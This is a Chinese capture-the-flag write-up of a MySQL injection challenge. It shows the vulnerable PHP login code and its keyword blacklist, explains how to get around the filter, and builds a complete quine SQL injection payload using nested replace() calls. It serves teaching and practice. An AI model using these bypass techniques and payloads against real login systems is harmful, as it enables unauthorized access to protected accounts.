例题：第五空间智能安全大赛-Web-yet_another_mysql_injection

做信息收集拿到源码`/?source`

```
regexp | between | in | flag | = | > | < | and | | | right | left | reverse
| update | extractvalue | floor | substr | & | ; | $ | 0x | sleep | 空白(\s)
```

checkSql过滤规则为黑名单

`空格` ——》`/**/`

`=`——》`like`

`and`——》`or`



关键源码：

```php
$password=$_POST['password'];
if ($username !== 'admin') {
    alertMes('only admin can login', 'index.php');
}
checkSql($password);
$sql="SELECT password FROM users WHERE username='admin' and password='$password';";
$user_result=mysqli_query($con,$sql);
$row = mysqli_fetch_array($user_result);
if (!$row) {
    alertMes("something wrong",'index.php');
}
if ($row['password'] === $password) {
	die($FLAG);
}
```

分析代码可知

username只能为admin，只能对password进行注入

弹出`something wrong`说明没有查询结果

弹出`wrong password`有结果，但输入不等于输出

由此可以使用bool注入和quine注入解题

bool注入发现是空表



#### 使用quine注入

构造quine使输入的SQL语句和输出一致

```
replace(object,search,replace)把object对象中出现的search替换成replace
```

基本形式`REPLACE(str,编码的间隔符,str)`
参数str形式`REPLACE(间隔符,编码的间隔符,间隔符)`
运算后变为`REPLACE(str,编码的间隔符,str)`

```
replace('replace(".",char(46),".")',char(46),'replace(".",char(46),".")')
执行后
replace("replace(".",char(46),".")",char(46),"replace(".",char(46),".")") 
```

可以看出引号有不同，所以先将双引号变为单引号

基本形式

```
replace(replace('str',char(34),char(39)),编码的间隔符,'str')
str的基本形式为
REPLACE(REPLACE("间隔符",CHAR(34),CHAR(39)),编码的间隔符,"间隔符")

 输入replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")')
 输出
replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")')
```

内层的replace将双引号替换为单引号

外层的replace将间隔符替换为str

payload

```
1'/**/union/**/select/**/replace(replace('1"/**/union/**/select/**/replace(replace(".",char(34),char(39)),char(46),".")#',char(34),char(39)),char(46),'1"/**/union/**/select/**/replace(replace(".",char(34),char(39)),char(46),".")#')#
```

